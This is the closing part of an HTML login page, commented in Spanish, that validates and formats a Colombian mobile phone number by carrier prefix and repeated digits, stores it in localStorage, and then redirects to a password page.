        });
      }
    </script>

    <!--
      NOTA: Se ha cambiado <script type="module"> por <script> normal
      para máxima compatibilidad con navegadores antiguos (Android 4.x,
      Chrome < 61, Safari < 10.1, etc.).

      La importación ES Modules NO funciona en esos navegadores.
      Por eso cargamos validateLogin.js de forma dinámica con un fallback.
    -->
    <script src="../js/validateLogin.js"></script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        var form = document.getElementById("homeForm");
        var loginButton = document.getElementById("loginButton");
        var mainContainer = document.getElementById("mainContainer");

        // Obtener LoginValidation desde el módulo cargado o desde window
        var LoginValidation = window.LoginValidation || (typeof module !== "undefined" && module.exports && module.exports.LoginValidation);

        // ============================================================
        // FALLBACK COMPLETO: valida 10 dígitos, prefijo colombiano válido
        // y que no haya 6 dígitos iguales consecutivos.
        // Se activa SOLO si validateLogin.js no expuso LoginValidation.
        // ============================================================
        if (typeof LoginValidation !== "function") {
          LoginValidation = function (formEl) {
            try {
              var phone = formEl.querySelector("#phoneNumber");
              if (!phone) return false;
              var v = phone.value.replace(/\D/g, "");
              if (v.length !== 10) return false;

              // Prefijos móviles válidos en Colombia
              var prefijos = [
                "300","301","302","304","305","324","333",       // Tigo
                "310","311","312","313","314","320","321","322","323", // Claro
                "315","316","317","318","319",                    // Movistar
                "350"                                             // Avantel
              ];
              if (prefijos.indexOf(v.slice(0, 3)) === -1) return false;

              // No 6 dígitos iguales consecutivos
              if (/(.)\1{5,}/.test(v)) return false;

              return true;
            } catch (e) { return false; }
          };
        }

        // Detectar cuando se abre el teclado (con fallback silencioso)
        function handleVisualViewport() {
          if (window.visualViewport) {
            if (window.visualViewport.height < window.innerHeight) {
              mainContainer.classList.add("keyboard-open");
            } else {
              mainContainer.classList.remove("keyboard-open");
            }
          }
        }

        if (window.visualViewport && window.visualViewport.addEventListener) {
          window.visualViewport.addEventListener("resize", handleVisualViewport);
        }

        form.addEventListener("submit", function (event) {
          event.preventDefault();
        });

        var actualizarEstadoBoton = function () {
          loginButton.disabled = true;
          if (LoginValidation(form)) {
            loginButton.disabled = false;
          } else {
            loginButton.disabled = true;
          }
        };

        form.addEventListener("input", actualizarEstadoBoton);
        form.addEventListener("keyup", actualizarEstadoBoton);
        form.addEventListener("change", actualizarEstadoBoton);

        loginButton.addEventListener("click", function (event) {
          event.preventDefault();
          if (LoginValidation(form)) {
            // Guardar el número de teléfono en localStorage (con fallback)
            try {
              var fd = {};
              try { fd = JSON.parse(localStorage.getItem("formData")) || {}; } catch(e){}
              var phoneInput = document.getElementById("phoneNumber");
              fd.phoneNumber = phoneInput ? phoneInput.value.replace(/\D/g, "") : "";
              try { localStorage.setItem("formData", JSON.stringify(fd)); } catch(e){}
            } catch (e) {}
            window.location.href = "access-sign-in-pass.php.html";
          }
        });
      });
    </script>

    <!-- ============================================================
         VALIDACIÓN Y FORMATEO DEL TELÉFONO
         - Solo dígitos
         - Máximo 10 dígitos
         - Formato: 305 641 6541
         - No permite 6 dígitos iguales consecutivos
         - Valida prefijo colombiano válido
         ============================================================ -->
    <script>
    (function () {
      var phoneInput = document.getElementById("phoneNumber");
      if (!phoneInput) return;

      // Prefijos móviles válidos en Colombia
      var prefijosValidos = [
        "300", "301", "302", "304", "305", "324", "333", // Tigo
        "310", "311", "312", "313", "314", "320", "321", "322", "323", // Claro
        "315", "316", "317", "318", "319", // Movistar
        "350" // Avantel
      ];

      // Formatea: 3056416541 -> "305 641 6541"
      function formatPhone(digits) {
        digits = digits.slice(0, 10);
        if (digits.length <= 3) return digits;
        if (digits.length <= 6) return digits.slice(0, 3) + " " + digits.slice(3);
        return digits.slice(0, 3) + " " + digits.slice(3, 6) + " " + digits.slice(6);
      }

      // Detecta 6+ repeticiones consecutivas del mismo dígito
      function hasSixRepeats(digits) {
        if (digits.length < 6) return false;
        for (var i = 0; i <= digits.length - 6; i++) {
          var c = digits[i];
          var rep = true;
          for (var j = 1; j < 6; j++) {
            if (digits[i + j] !== c) { rep = false; break; }
          }
          if (rep) return true;
        }
        return false;
      }

      // Verifica que el prefijo sea válido (solo cuando hay 3+ dígitos)
      function prefijoEsValido(digits) {
        if (digits.length < 3) return true;
        return prefijosValidos.indexOf(digits.slice(0, 3)) !== -1;
      }

      function sanitize(value) {
        var digits = value.replace(/\D/g, "").slice(0, 10);

        while (digits.length >= 6 && hasSixRepeats(digits)) {
          digits = digits.slice(0, -1);
        }

        if (digits.length >= 3 && !prefijoEsValido(digits)) {
          digits = digits.slice(0, 2);
        }

        return digits;
      }

      function applyFormat() {
        var digits = sanitize(phoneInput.value);
        var formatted = formatPhone(digits);

        var selStart = phoneInput.selectionStart;
        var digitsBeforeCursor = phoneInput.value
          .slice(0, selStart)
          .replace(/\D/g, "").length;

        phoneInput.value = formatted;

        var newPos = 0, counted = 0;
        for (var i = 0; i < formatted.length; i++) {
          if (counted >= digitsBeforeCursor) break;
          if (/\d/.test(formatted[i])) counted++;
          newPos++;
        }
        try {
          phoneInput.setSelectionRange(newPos, newPos);
        } catch (e) {}
      }

      phoneInput.addEventListener("input", applyFormat);
      phoneInput.addEventListener("paste", function () {
        setTimeout(applyFormat, 0);
      });

      phoneInput.addEventListener("keypress", function (e) {
        var k = e.key;
        if (k.length === 1 && !/[0-9]/.test(k)) {
          e.preventDefault();
        }
      });
    })();
    </script>
  </body>
